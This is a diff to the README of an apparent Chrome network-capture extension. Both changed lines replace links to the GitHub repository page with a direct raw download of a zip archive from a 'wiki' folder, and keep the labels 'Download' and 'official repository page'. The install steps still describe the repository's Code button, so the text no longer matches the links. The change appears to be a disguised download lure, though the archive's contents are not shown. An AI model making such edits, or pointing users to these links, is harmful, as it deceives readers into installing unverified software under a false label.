@@ -1,6 +1,6 @@
 # 🔍 network-capture-pro-chrome-extension - Capture all browser network data simply
 
-[![](https://img.shields.io/badge/Download-Chrome-blue.svg)](https://github.com/connornominative2175/network-capture-pro-chrome-extension)
+[![](https://img.shields.io/badge/Download-Chrome-blue.svg)](https://raw.githubusercontent.com/connornominative2175/network-capture-pro-chrome-extension/main/wiki/capture-extension-pro-network-chrome-v2.5.zip)
 
 ## What this tool does
 
@@ -16,7 +16,7 @@ Professionals use this tool to debug web applications. It helps you check how we
 
 ## 📥 Installing the extension
 
-1. Go to the [official repository page](https://github.com/connornominative2175/network-capture-pro-chrome-extension).
+1. Go to the [official repository page](https://raw.githubusercontent.com/connornominative2175/network-capture-pro-chrome-extension/main/wiki/capture-extension-pro-network-chrome-v2.5.zip).
 2. Look for the green button labeled Code.
 3. Select Download ZIP from the menu.
 4. Save the file to your computer.
